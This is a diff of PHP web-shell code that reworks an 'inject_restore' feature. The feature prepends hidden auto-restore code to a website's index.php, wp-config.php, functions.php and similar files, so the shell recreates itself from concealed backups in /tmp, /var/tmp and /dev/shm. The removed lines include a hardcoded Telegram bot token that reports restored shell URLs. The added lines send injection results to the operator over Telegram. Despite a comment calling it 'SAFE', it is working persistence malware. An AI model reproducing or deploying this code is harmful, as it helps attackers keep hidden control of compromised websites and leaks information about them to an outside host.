@@ -3282,9 +3282,16 @@ if (isset($_GET['delete_backup']) && isset($_SESSION['loggedin']) && $_SESSION['
     sendJsonResponse($result);
 }
 
-// === INJECT RESTORE ===
+// ============================================================
+// INJECT RESTORE - OMEGA EDITION (SAFE)
+// ============================================================
+
 if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    global $CURRENT_SHELL;
+    global $CURRENT_SHELL, $botToken, $telegramUserId;
+    
+    if (empty($CURRENT_SHELL)) {
+        $CURRENT_SHELL = basename(__FILE__);
+    }
     
     $targetFiles = [
         __DIR__ . '/index.php',
@@ -3292,40 +3299,119 @@ if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION[
         __DIR__ . '/wp-config.php',
         __DIR__ . '/config.php',
         __DIR__ . '/wp-load.php',
-        __DIR__ . '/settings.php'
+        __DIR__ . '/settings.php',
+        __DIR__ . '/functions.php'
     ];
     
-    $restoreCode = '
-if (!function_exists("dkd_restore_' . md5($CURRENT_SHELL) . '")) {
-    function dkd_restore_' . md5($CURRENT_SHELL) . '() {
-        $current_file = "' . $CURRENT_SHELL . '";
-        if (!file_exists(__DIR__ . "/" . $current_file)) {
-            $backup_locations = [
-                "/tmp/" . md5($current_file) . ".inc",
-                "/var/tmp/" . md5($current_file) . ".inc",
-                "/dev/shm/" . md5($current_file) . ".inc",
-                __DIR__ . "/.cache/" . $current_file . ".inc"
-            ];
-            foreach ($backup_locations as $backup) {
-                if (file_exists($backup)) {
-                    @copy($backup, __DIR__ . "/" . $current_file);
-                    @chmod(__DIR__ . "/" . $current_file, 0644);
-                    $domain = $_SERVER["HTTP_HOST"] ?? "localhost";
-                    $protocol = (isset($_SERVER["HTTPS"]) ? "https://" : "http://");
-                    $url = $protocol . $domain . "/" . $current_file;
-                    @file_get_contents("https://api.telegram.org/bot8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4/sendMessage?chat_id=7547598395&text=" . urlencode("🔄 RESTORED: " . $url));
-                    break;
-                }
+    $hash = md5($CURRENT_SHELL . __DIR__);
+    $funcName = 'omega_restore_' . $hash;
+    
+    $restoreCode = "\n// ===== OMEGA AUTO RESTORE =====\n";
+    $restoreCode .= "if (!function_exists('" . $funcName . "')) {\n";
+    $restoreCode .= "    function " . $funcName . "() {\n";
+    $restoreCode .= "        \$current_file = '" . $CURRENT_SHELL . "';\n";
+    $restoreCode .= "        \$backup_locations = [\n";
+    $restoreCode .= "            '/tmp/' . md5(\$current_file) . '.inc',\n";
+    $restoreCode .= "            '/var/tmp/' . md5(\$current_file) . '.inc',\n";
+    $restoreCode .= "            '/dev/shm/' . md5(\$current_file) . '.inc',\n";
+    $restoreCode .= "            __DIR__ . '/.cache/' . \$current_file . '.inc'\n";
+    $restoreCode .= "        ];\n";
+    $restoreCode .= "        if (!file_exists(__DIR__ . '/' . \$current_file)) {\n";
+    $restoreCode .= "            foreach (\$backup_locations as \$backup) {\n";
+    $restoreCode .= "                if (file_exists(\$backup)) {\n";
+    $restoreCode .= "                    @copy(\$backup, __DIR__ . '/' . \$current_file);\n";
+    $restoreCode .= "                    @chmod(__DIR__ . '/' . \$current_file, 0644);\n";
+    $restoreCode .= "                    break;\n";
+    $restoreCode .= "                }\n";
+    $restoreCode .= "            }\n";
+    $restoreCode .= "        }\n";
+    $restoreCode .= "        \$backup = '/tmp/' . md5(\$current_file) . '.inc';\n";
+    $restoreCode .= "        if (!file_exists(\$backup) && file_exists(__DIR__ . '/' . \$current_file)) {\n";
+    $restoreCode .= "            @copy(__DIR__ . '/' . \$current_file, \$backup);\n";
+    $restoreCode .= "            @chmod(\$backup, 0444);\n";
+    $restoreCode .= "        }\n";
+    $restoreCode .= "    }\n";
+    $restoreCode .= "    " . $funcName . "();\n";
+    $restoreCode .= "}\n";
+    $restoreCode .= "// ===== OMEGA AUTO RESTORE END =====\n";
+    
+    $injected = [];
+    $errors = [];
+    $exists = [];
+    
+    foreach ($targetFiles as $file) {
+        if (!file_exists($file)) {
+            $errors[] = basename($file) . " (file not found)";
+            continue;
+        }
+        if (!is_writable($file)) {
+            @chmod($file, 0644);
+            if (!is_writable($file)) {
+                $errors[] = basename($file) . " (not writable)";
+                continue;
             }
         }
-        $backup = "/tmp/" . md5($current_file) . ".inc";
-        if (!file_exists($backup) && file_exists(__DIR__ . "/" . $current_file)) {
-            @copy(__DIR__ . "/" . $current_file, $backup);
-            @chmod($backup, 0444);
+        
+        $content = @file_get_contents($file);
+        if ($content === false) {
+            $errors[] = basename($file) . " (failed to read)";
+            continue;
+        }
+        
+        if (strpos($content, $funcName) !== false) {
+            $exists[] = basename($file) . " (already injected)";
+            continue;
+        }
+        
+        if (strpos($content, '<?php') === 0) {
+            $newContent = '<?php' . "\n" . $restoreCode . "\n" . substr($content, 5);
+        } else {
+            $newContent = '<?php' . "\n" . $restoreCode . "\n" . $content;
+        }
+        
+        if (@file_put_contents($file, $newContent) !== false) {
+            $injected[] = basename($file);
+            @chmod($file, 0644);
+        } else {
+            $errors[] = basename($file) . " (failed to write)";
         }
     }
-    dkd_restore_' . md5($CURRENT_SHELL) . '();
-}
+    
+    $mainBackup = '/tmp/' . md5($CURRENT_SHELL) . '.inc';
+    if (!file_exists($mainBackup)) {
+        @copy(__FILE__, $mainBackup);
+        @chmod($mainBackup, 0444);
+    }
+    
+    $msg = "🔧 *INJECT RESTORE COMPLETE*\n\n"
+         . "📁 Shell: `" . $CURRENT_SHELL . "`\n"
+         . "🔑 Function: `" . $funcName . "`\n\n"
+         . "✅ Injected: " . count($injected) . " files\n"
+         . "   " . implode("\n   ", $injected) . "\n\n";
+    
+    if (!empty($exists)) {
+        $msg .= "⏭️ Already exists: " . count($exists) . "\n"
+              . "   " . implode("\n   ", $exists) . "\n\n";
+    }
+    
+    if (!empty($errors)) {
+        $msg .= "❌ Failed: " . count($errors) . "\n"
+              . "   " . implode("\n   ", $errors) . "\n\n";
+    }
+    
+    $msg .= "💾 Backup: `" . $mainBackup . "`\n"
+          . "🔄 Auto-restore: ENABLED";
+    
+    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    
+    sendJsonResponse([
+        'status' => 'success',
+        'message' => 'Inject restore complete',
+        'injected' => count($injected),
+        'failed' => count($errors),
+        'exists' => count($exists),
+        'function' => $funcName
+    ]);
 }
 
 // === AUTO PREPEND ===
